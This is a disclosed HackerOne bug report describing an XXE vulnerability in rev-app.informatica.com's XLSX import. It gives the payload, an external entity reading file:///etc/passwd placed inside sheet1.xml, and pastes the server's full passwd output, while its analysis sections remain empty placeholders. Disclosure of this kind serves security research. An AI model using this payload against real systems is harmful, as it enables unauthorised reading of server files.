---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '105434'
original_report_id: '105434'
title: '[rev-app.informatica.com] - XXE'
weakness: Uncontrolled Resource Consumption
team_handle: informatica
created_at: '2015-12-15T17:47:41.939Z'
disclosed_at: '2016-08-02T15:30:38.774Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 44
tags:
- hackerone
- uncontrolled-resource-consumption
---

# [rev-app.informatica.com] - XXE

## Metadata

- HackerOne Report ID: 105434
- Weakness: Uncontrolled Resource Consumption
- Program: informatica
- Disclosed At: 2016-08-02T15:30:38.774Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

1. Open file xxe.xlsx like zip-archive
2. Read file xxe.xlsx\xl\worksheets\sheet1.xml

In file I wrote XXE payload:
<!DOCTYPE foo [  <!ELEMENT foo ANY ><!ENTITY xxe PUBLIC "lol" "file:///etc/passwd" >]>
Then, i went to https://rev-app.informatica.com and made new project and imported my XLSX-file

When it was impoted i see /etc/passwd file:
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
gopher:x:13:30:gopher:/var/gopher:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin
abrt:x:173:173::/etc/abrt:/sbin/nologin
haldaemon:x:68:68:HAL daemon:/:/sbin/nologin
ntp:x:38:38::/etc/ntp:/sbin/nologin
saslauth:x:499:76:Saslauthd user:/var/empty/saslauth:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
oprofile:x:16:16:Special user account to be used by OProfile:/home/oprofile:/sbin/nologin
ec2-user:x:500:500::/home/ec2-user:/bin/bash
scom:x:501:501::/home/scom:/bin/bash
nscd:x:28:28:NSCD Daemon:/:/sbin/nologin
nslcd:x:65:55:LDAP Client User:/:/sbin/nologin
dataprep:x:504:505::/home2/dataprep:/bin/bash
zabbix:x:498:506::/home/zabbix:/bin/bash

Video (private): https://youtu.be/612SgFdOrB0

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
